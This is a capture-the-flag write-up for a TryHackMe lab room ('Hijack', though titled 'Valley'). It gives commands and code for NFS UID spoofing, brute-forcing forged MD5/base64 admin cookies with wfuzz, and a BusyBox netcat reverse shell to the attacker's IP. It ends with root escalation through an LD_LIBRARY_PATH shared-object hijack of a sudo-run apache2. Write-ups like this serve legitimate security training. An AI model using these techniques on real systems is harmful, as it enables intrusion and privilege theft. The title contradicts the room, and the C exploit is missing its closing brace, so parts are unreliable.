# TryHackMe Writeup — [Valley](https://tryhackme.com/room/hijack)

## Description

Hijack is a practical room focused on exploiting NFS services and misconfigurations in web applications. During the process, the player learns techniques related to NFS exploitation, web application analysis, bypassing filters, abusing sudo misconfigurations, and privilege escalation through library hijacking.

## Scanning & Enumeration
Port scanning revealed the following services:
```python
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
111/tcp open  rpcbind
2049/tcp open  nfs
```
The website itself provided little information—just a login form and an admin page, only accessible to administrators.

## Exploiting NFS
Using ```showmount -e <IP>```, we found an open NFS share:
```python
/mnt/share *
```
To access its contents, we created a local user with UID and GID 1003:
```python
sudo useradd hijack
sudo usermod -u 1003 hijack
sudo groupmod -g 1003 hijack
su hijack
```
After mounting the share, we discovered the file for_employees.txt containing FTP credentials.

## FTP Access
Connecting to the FTP server revealed two interesting files:

* ```.from_admin.txt``` — a message from the admin about a "safe" password list.

* ```.passwords_list.txt``` — a probable password list.

## Web Exploitation
Upon registering a new account, the website generated a session cookie in the format ```USERNAME:HASH (MD5)```. Using that, we generated our own cookies to perform brute-force:

This script can help us with that
```python
import hashlib
import base64

with open('passwords_list.txt', 'r') as f:
    lines = f.readlines()

for line in lines:
    stripped_line = line.strip()
    
    hashed_line = hashlib.md5(stripped_line.encode('utf-8')).hexdigest()
    
    modified_hash = 'admin:' + hashed_line
    
    encoded_hash = base64.b64encode(modified_hash.encode('utf-8'))
    
    print(encoded_hash.decode('utf-8'))
```

```python
python3 hijack.py > cookies.txt
wfuzz -u http://<target_ip>/administration.php -w cookies.txt -X POST -b 'PHPSESSID=FUZZ' --hh 51
```
> We obtained a valid PHPSESSID for the administrator, granting access to ```administration.php```.

## Command Execution & Reverse Shell
By bypassing filtering with ```&id```, we confirmed that commands were executed as ```www-data```.

Reverse shell using BusyBox:
```python
$(busybox nc <your-ip> 1234 -e /bin/bash)
```
## User Access (Rick)
Inside ```config.php```, we found credentials for the user ```rick```, allowing us to access ```user.txt```.

## Privilege Escalation to root
The output of ```sudo -l``` revealed:
```python
(root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```
## Vulnerability Explanation
Apache is run with root privileges → we can inject a malicious shared object (.so) file. Using the ```__attribute__((constructor))``` function, our code is executed before Apache starts, providing root access.

## Example exploit code:
```python
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
```
Compiling and exploiting:
```python
gcc -o /tmp/libcrypt.so.1 -shared -fPIC malware.c
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```
> We successfully obtained root and read ```root.txt```.

This room provides excellent practice in enumeration, exploitation of services, and privilege escalation techniques.
